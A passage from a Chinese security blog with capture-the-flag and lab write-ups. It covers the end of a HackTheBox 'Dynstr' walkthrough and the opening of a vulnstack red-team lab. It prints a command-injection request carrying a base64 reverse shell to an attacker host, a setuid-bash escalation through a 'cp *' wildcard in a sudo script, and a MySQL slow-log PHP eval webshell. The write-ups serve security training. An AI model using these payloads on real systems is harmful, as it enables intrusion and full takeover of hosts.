class="hljs-number">0</span>:<span class="hljs-number">15</span>:<span class="hljs-number">28</span>] :: Errors: <span class="hljs-number">2</span> ::<br></code></pre></td></tr></table></figure><p>题外话：在复盘的时候发现在no-ip.com能直接发现相关的接口，也就是其实是不用爆破的。。。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019195943707.png" alt="image-20211019195943707"></p><p>直接访问该链接，结果如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019191835400.png" alt="image-20211019191835400"></p><p>Google一下能够发现该接口使用的验证信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009120205933.png" alt="image-20211009120205933"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019191913980.png" alt="image-20211019191913980"></p><p>遂构造数据包，成功发送请求：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009121036542.png" alt="image-20211009121036542"></p><p>尝试输入一些特殊字符，得到报错。发现使用了nsupdate。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009121329235.png" alt="image-20211009121329235"></p><p>查看nsupdate，发现是linux中的二进制文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019192113038.png" alt="image-20211019192113038"></p><p>我们不难推测整个接口对二进制文件的封装，底层调用了nsupdate对DNS进行升级。由此我们合理推测该接口存在命令注入。</p><p>在对接口进行命令注入测试的过程中发现<code>.</code>的存在会干扰正常的解析（因<code>.</code>也被用来分割域名）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009123548168.png" alt="image-20211009123548168"></p><p>这里有两种方法进行绕过，一个是使用BASE64编码，一个是将IP地址使用16进制进行表示。这里使用的是第一种方法，最后构造出的数据包如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /nic/update?hostname=`echo+YmFzaCAtaSA%<span class="hljs-number">2</span>bJiAvZGV2L3RjcC8xMC4xMC4xNi4yMi80NDQ0IDA%<span class="hljs-number">2</span>bJjE%<span class="hljs-number">3</span>d+|+base64+-d+|+bash`%<span class="hljs-number">3</span>b753router.no-ip.htb&amp;myip=<span class="hljs-number">174.56.139.141</span>&amp;location=<span class="hljs-number">753</span>router HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.244</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">94</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4606</span>.<span class="hljs-number">81</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Authorization</span>: Basic ZHluYWRuczpzbmRhbnlk<br><br><br></code></pre></td></tr></table></figure><p>在攻击机上使用nc对4444端口进行监听，得到反弹的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211016211543520.png" alt="image-20211016211543520"></p><h1 id="0x03-User-Shell"><a href="#0x03-User-Shell" class="headerlink" title="0x03 User Shell"></a>0x03 User Shell</h1><p>拿到shell我们可以先升级，升级成一个半完整的终端，后面使用<code>nsupdate</code>会方便一些：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>翻了一圈，最后找到home目录，有两个用户：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">www</span>-data@dynstr:/home$ ls -l<br><span class="hljs-attribute">ls</span> -l<br><span class="hljs-attribute">total</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">5</span> bindmgr bindmgr <span class="hljs-number">4096</span> Oct  <span class="hljs-number">8</span> <span class="hljs-number">14</span>:<span class="hljs-number">40</span> bindmgr<br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">3</span> dyna    dyna    <span class="hljs-number">4096</span> Mar <span class="hljs-number">18</span>  <span class="hljs-number">2021</span> dyna<br></code></pre></td></tr></table></figure><p>dyna用户里面没有任何东西，进入<code>bindmgr</code>账户可以发现一个<code>support-case-C62796521</code>文件夹：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@dynstr</span><span class="hljs-symbol">:/home/bindmgr</span><span class="hljs-variable">$ </span>ls -l<br>ls -l<br>total <span class="hljs-number">1168</span><br>drwxr-xr-x <span class="hljs-number">2</span> bindmgr bindmgr    <span class="hljs-number">4096</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> support-<span class="hljs-keyword">case</span>-<span class="hljs-title class_">C62796521</span><br>-r-------- <span class="hljs-number">1</span> bindmgr bindmgr      <span class="hljs-number">33</span> <span class="hljs-title class_">Oct</span>  <span class="hljs-number">8</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span> user.txt<br></code></pre></td></tr></table></figure><p>另外可能也可以看到一个二进制bash文件，这个可能是其他师傅留下的，可以直接拿到bindmgr的shell，我们不用去管他。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211009124510463.png" alt="image-20211009124510463"></p><p>在该目录下有如下文件，在<code>C62796521-debugging.script</code>中可以发现有泄露的ssh私钥：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tap">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -la<br>ls -la<br>total 436<br>drwxr-xr-x<span class="hljs-number"> 2 </span>bindmgr bindmgr  <span class="hljs-number"> 4096 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>.<br>drwxr-xr-x<span class="hljs-number"> 6 </span>bindmgr bindmgr  <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 19 </span>09:48 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr<span class="hljs-number"> 237141 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>C62796521-debugging.script<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr <span class="hljs-number"> 29312 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>C62796521-debugging.timing<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr  <span class="hljs-number"> 1175 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>command-output-C62796521.txt<br>-rw-r--r--<span class="hljs-number"> 1 </span>bindmgr bindmgr<span class="hljs-number"> 163048 </span>Mar<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>strace-C62796521.txt<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211016212958927.png" alt="image-20211016212958927"></p><p>保存该文件为<code>bindmgr</code>，尝试使用该私钥进行连接，失败：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019202621778.png" alt="image-20211019202621778"></p><p>经过对照确认私钥为正确的私钥（公钥文件可以去家目录的<code>.ssh</code>文件夹中读取）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018214739959.png" alt="image-20211018214739959"></p><p>查看.ssh文件夹中的<code>authorized_keys</code>文件，可以发现该私钥限制了使用范围：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018211143850.png" alt="image-20211018211143850"></p><p>也就是我们需要将我们的IP纳入<code>*.infra.dyna.htb</code>的范围中，所以得利用box中的nsupdate命令增加dns记录：</p><p>对于nsupdate相信很多人都是陌生的，这里最好的方法是去看网页是怎么做的。打开<code>update</code>文件能够找到调用的命令：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019203502840.png" alt="image-20211019203502840"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018210950304.png" alt="image-20211018210950304"></p><p>要是对<code>$h</code>，<code>$d</code>两个参数有疑问的可以自己跑一下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ php -a                                                                130 ⨯<br>Interactive mode enabled<br><br>php &gt; list(<span class="hljs-variable">$h</span>,<span class="hljs-variable">$d</span>) = explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;test1.test2.com&quot;</span>,2);<br>php &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$h</span>;<br>test1<br>php &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$d</span>;<br>test2.com<br>php &gt; <br></code></pre></td></tr></table></figure><p>一切准备就绪后可以直接调用nsupdate命令更新DNS记录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/</span>ddns.key<br></code></pre></td></tr></table></figure><p>但是一开始会报错，一番尝试后发现是key不对。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213244332.png" alt="image-20211018213244332"></p><p>在<code>ddns.key</code>的同级目录下能够找到真正能用的key，即<code>infra.key</code>：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213417109.png" alt="image-20211018213417109"></p><p>首先增加正向解析的A记录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@dynstr:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>nic$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/i</span>nfra.key<br>&lt;<span class="hljs-regexp">/nic$ /u</span>sr<span class="hljs-regexp">/bin/</span>nsupdate -t <span class="hljs-number">1</span> -k <span class="hljs-regexp">/etc/</span>bind/infra.key<br>&gt; server localhost<br>server localhost<br>&gt; zone dyna.htb<br>zone dyna.htb<br>&gt; update add h1nt.infra.dyna.htb <span class="hljs-number">30</span> IN A <span class="hljs-number">10.10</span>.<span class="hljs-number">16.33</span><br>update add h1nt.infra.dyna.htb <span class="hljs-number">30</span> IN A <span class="hljs-number">10.10</span>.<span class="hljs-number">16.33</span><br>&gt; send<br>send<br>&gt; <br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213646409.png" alt="image-20211018213646409"></p><p>使用<code>nslookup</code>命令验证成功添加：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018213734451.png" alt="image-20211018213734451"></p><p>但是我们还是不能使用私钥进行ssh连接，原因是ssh还会进行反向解析。可以参考stackoverflow的<a href="https://serverfault.com/questions/206365/ssh-reverse-dns-lookup">一篇帖子</a>：</p><p>无论原因如何，我们需要同样把反向解析记录给加上。</p><p>首先可以使用nslookup看看需要添加的记录是什么。注意不是你的IP地址：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019204733872.png" alt="image-20211019204733872"></p><p>使用如下命令添加反向解析记录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@dynstr:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>nic$ <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nsupdate -t 1 -k /</span>etc<span class="hljs-regexp">/bind/i</span>nfra.key<br>&lt;<span class="hljs-regexp">/nic$ /u</span>sr<span class="hljs-regexp">/bin/</span>nsupdate -t <span class="hljs-number">1</span> -k <span class="hljs-regexp">/etc/</span>bind/infra.key<br>&gt; server localhost<br>server localhost<br>&gt; update add <span class="hljs-number">33.16</span>.<span class="hljs-number">10.10</span>.<span class="hljs-keyword">in</span>-addr.arpa <span class="hljs-number">30</span> IN PTR h1nt.infra.dyna.htb<br>update add <span class="hljs-number">33.16</span>.<span class="hljs-number">10.10</span>.<span class="hljs-keyword">in</span>-addr.arpa <span class="hljs-number">30</span> IN PTR h1nt.infra.dyna.htb<br>&gt; send<br>send<br>&gt; <br></code></pre></td></tr></table></figure><p>而后再次使用nslookup进行验证：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018223740295.png" alt="image-20211018223740295"></p><p>添加成功后我们就能使用私钥进行连接了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211018223912951.png" alt="image-20211018223912951"></p><h1 id="0x04-Root-Shell"><a href="#0x04-Root-Shell" class="headerlink" title="0x04 Root Shell"></a>0x04 Root Shell</h1><p>连接上后尝试提权，使用<code>sudo -l</code>能够发现一个脚本：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019101601763.png" alt="image-20211019101601763"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/bash</span><br><br><span class="hljs-comment"># This script generates named.conf.bindmgr to workaround the problem</span><br><span class="hljs-comment"># that bind/named can only include single files but no directories.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span><br><span class="hljs-comment"># from named.conf.local (or others) and will include all files from the</span><br><span class="hljs-comment"># directory /etc/bin/named.bindmgr.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> The script is work in progress. For now bind is not including</span><br><span class="hljs-comment">#       named.conf.bindmgr. </span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Currently the script is only adding files to the directory but</span><br><span class="hljs-comment">#       not deleting them. As we generate the list of files to be included</span><br><span class="hljs-comment">#       from the source directory they won&#x27;t be included anyway.</span><br><br>BINDMGR_CONF=/etc/bind/named.conf.bindmgr<br>BINDMGR_DIR=/etc/bind/named.bindmgr<br><br><span class="hljs-function"><span class="hljs-title">indent</span></span>() &#123; sed <span class="hljs-string">&#x27;s/^/    /&#x27;</span>; &#125;<br><br><span class="hljs-comment"># Check versioning (.version)</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Running <span class="hljs-variable">$0</span> to stage new configuration from <span class="hljs-variable">$PWD</span>.&quot;</span><br><span class="hljs-keyword">if</span> [[ ! -f .version ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span><br>    <span class="hljs-built_in">exit</span> 42<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;`cat .version 2&gt;/dev/null`&quot;</span> -le <span class="hljs-string">&quot;`cat <span class="hljs-variable">$BINDMGR_DIR</span>/.version 2&gt;/dev/null`&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span><br>    <span class="hljs-built_in">exit</span> 43<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Create config file that includes all files from named.bindmgr.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Creating <span class="hljs-variable">$BINDMGR_CONF</span> file.&quot;</span><br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;// Automatically generated file. Do not modify manually.\n&#x27;</span> &gt; <span class="hljs-variable">$BINDMGR_CONF</span><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> * ; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &gt;&gt; <span class="hljs-variable">$BINDMGR_CONF</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># Stage new version of configuration files.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Staging files to <span class="hljs-variable">$BINDMGR_DIR</span>.&quot;</span><br><span class="hljs-built_in">cp</span> .version * /etc/bind/named.bindmgr/<br><br><span class="hljs-comment"># Check generated configuration with named-checkconf.</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Checking staged configuration.&quot;</span><br>named-checkconf <span class="hljs-variable">$BINDMGR_CONF</span> &gt;/dev/null<br><span class="hljs-keyword">if</span> [[ $? -ne 0 ]] ; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] ERROR: The generated configuration is not valid. Please fix following errors: &quot;</span><br>    named-checkconf <span class="hljs-variable">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent<br>    <span class="hljs-built_in">exit</span> 44<br><span class="hljs-keyword">else</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Configuration successfully staged.&quot;</span><br>    <span class="hljs-comment"># *** TODO *** Uncomment restart once we are live.</span><br>    <span class="hljs-comment"># systemctl restart bind9</span><br>    <span class="hljs-keyword">if</span> [[ $? -ne 0 ]] ; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[-] Restart of bind9 via systemctl failed. Please check logfile: &quot;</span><br>systemctl status bind9<br>    <span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Restart of bind9 via systemctl succeeded.&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>这个脚本写得有纰漏的地方是它同时使用了<code>cp</code>命令和通配符<code>*</code>，我们可以利用它进行权限提升。原理是cp命令会改变文件的属主，以及cp命令可以设置保留文件的权限位，配合setuid标志位就能够拿到root的shell。</p><p>首先我们可以新建一个文件夹，配置好<code>.version</code>文件，而后将<code>bash</code>复制到当前文件夹中。</p><p>之后新建一个文件，名字为<code>--preserve=mode</code>，这个命令可以在保留复制后的文件的权限位。关于更多的解释可以使用<code>man</code>命令进行详细查看。</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">touch</span> <span class="hljs-literal">--</span> <span class="hljs-literal">--</span><span class="hljs-comment">preserve=mode</span><br></code></pre></td></tr></table></figure><p>创建后的三个文件如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155725154.png" alt="image-20211019155725154"></p><p>之后使用chmod给bash设置setuid标志位：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">4755</span> bash<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155812638.png" alt="image-20211019155812638"></p><p>接着便可以跑脚本了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>bindmgr.sh<br></code></pre></td></tr></table></figure><p>在设置的目录下即可看到一个设置了setuid标志位的属主为root的bash：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155849032.png" alt="image-20211019155849032"></p><p>使用该bash即可启动一个root的shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bash -p<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/dynstr.assets/image-20211019155921666.png" alt="image-20211019155921666"></p><p>自此，整个Box拿下！</p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>命令注入</li><li>敏感信息读取</li><li>dns解析记录的配置</li><li><code>cp</code>与<code>*</code>组合的滥用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队评估一记录</title>
    <link href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/"/>
    <url>/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>靶机下载地址 <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>按要求对三个靶机进行网络环境配置，最终网络拓扑结构如下</p><p>win7          外网192.168.133.143&#x2F;内网 192.168.58.128</p><p>win server 2003          内网 192.168.58.141</p><p>win server 2008          内网192.168.58.138</p><p>按靶场介绍，口令统一为hongrisec@2019</p><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><p>对端口信息进行探测，发现开启了80端口和3306端口。推测假设了WEB服务和MySQL数据库服务</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815195906131.png" alt="image-20210815195906131"></p><p>对WEB端进行目录扫描，可以发现pma和beifen.rar这两个敏感的目录&#x2F;文件</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815200251803.png" alt="image-20210815200251803"></p><p>按正常来说是通过CMS进行Getshell，但这里发现可以MySQL日志GetShell，于是就直接做了</p><p>这里需要知道网站的绝对路径，这里是通过访问站点时的PHP探针发现的。除了这个还可以通过尝试或者报错的方式来进行获取。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815202341008.png" alt="image-20210815202341008"></p><p>写入后可以拿到WebShell</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815202301100.png" alt="image-20210815202301100"></p><p>通过在蚁剑中执行命令下载Payload并上线CS</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815203137819.png" alt="image-20210815203137819"></p><p>上线后对目标主机进行网络环境的探测，可以发现有域环境存在（必须的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell ipconfig<br>shell net time /domain<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815203507423.png" alt="image-20210815203507423"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815204117739.png" alt="image-20210815204117739"></p><p>接着寻找域控，通过命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell nltest /DCLIST:god.org<br>shell net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p>可以发现域控的主机名为OWA，以及存在的域管理员</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815205053249.png" alt="image-20210815205053249"></p><p><img 